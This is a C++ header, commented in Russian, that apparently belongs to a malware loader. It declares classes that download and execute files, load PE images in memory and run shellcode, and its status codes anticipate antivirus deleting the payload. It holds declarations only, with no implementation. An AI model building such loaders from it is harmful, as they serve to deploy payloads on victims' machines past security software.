#pragma once

#include "global.hpp"


typedef enum _downloadexec_status
{
	STATUS_ERROR_DE_UNKNOWN, // неизвестная ошибка // se_unknown
	STATUS_ERROR_DE_INVALIDPE, // невалид пе // se_invpe
	STATUS_ERROR_DE_CREATE_FILE_ACCESSDENIED, // отказано в доступе при создании файла - видимо у процесса урезанные права // se_cfad
	STATUS_ERROR_DE_CREATE_FILE_UNKNOWN, // неизвестная причина невозможности создания файла // se_cfunknown
	STATUS_ERROR_DE_EXEC_ACCESSDENIED, // может быть если антивирус удаляет файл // se_exad
	STATUS_ERROR_DE_EXEC_FILENOTFOUND, // может быть если антивирус уже удалил его // se_ex404
	STATUS_ERROR_DE_EXEC_UNKNOWN, // не может исполнить с неизвестной ошибкой // se_exunknown
	STATUS_ERROR_DE_PATH_ERROR, // не смог получить путь куда качать // se_perr
	STATUS_DE_SUCCESS // успешно // success
} downloadexec_status_t;

typedef enum _dllloader_status
{
	STATUS_ERROR_DL_UNKNOWN, // неизвестная ошибка загрузки // se_unknown
	STATUS_ERROR_DL_INVALIDPE, // невалид PE или невалид HM Executable // se_invpe
	STATUS_ERROR_DL_INVALID_ARCH, // архитектура не совпадает // se_invarch
	STATUS_ERROR_DL_EXCEPTION_DIRECTORY, // есть EXCEPTION_DIRECTORY не можем загрузить // se_exdir
	STATUS_ERROR_DL_TLS_DIRECTORY, // есть TLS не можем загрузить // se_tls
	STATUS_ERROR_DL_COM_DIRECTORY, // дотнет? // se_dotnet
	STATUS_DL_SUCCESS // success
} dllloader_status_t;

typedef enum __shellcodeloader_status
{
	STATUS_ERROR_SC_UNKNOWN, // неизвестная ошибка загрузки // se_unknown
	STATUS_ERROR_SC_SUCCESS // success
} shellcodeloader_status_t;

struct _exec_status
{
	union _uex_statuses
	{
		dllloader_status_t dll_status;
		downloadexec_status_t de_status;
		shellcodeloader_status_t sc_status;
	} status;
	blob data_result;
};

class ICommandExecutor
{
public:
	virtual ~ICommandExecutor() = default;
	// исполняет команду pbDataBuffer, сохраняя в exec_status результат исполнения. Если возвращает отличное от true, то коды ошибок 
	virtual BOOL execute(blob *pbDataBuffer) = 0;
	// возвращает exec_status
	virtual _exec_status *get_status() = 0;
};

class DownloadExecute : public ICommandExecutor
{
public:
	DownloadExecute();
	~DownloadExecute();

	BOOL execute(blob *pbDataBuffer);
	_exec_status *get_status();
protected:
	_exec_status status;
private:
	downloadexec_status_t ExecFile(PWCHAR pwFilePath);
	downloadexec_status_t Dump2File(PWCHAR wchName, LPBYTE lpData, SIZE_T dwSize);
	downloadexec_status_t DEMakePath(PWCHAR pwFilePath, UINT uMaxCharsPath);
};

class PeLoader : public ICommandExecutor
{
public:
	PeLoader();
	~PeLoader();

	BOOL execute(blob *pbDataBuffer);
	_exec_status *get_status();
protected:
	_exec_status status;
private:

};

class ShellcodeLoader : public ICommandExecutor
{
public:
	ShellcodeLoader();
	~ShellcodeLoader();

	BOOL execute(blob *pbDataBuffer);
	_exec_status *get_status();
protected:
	_exec_status status;
private:

};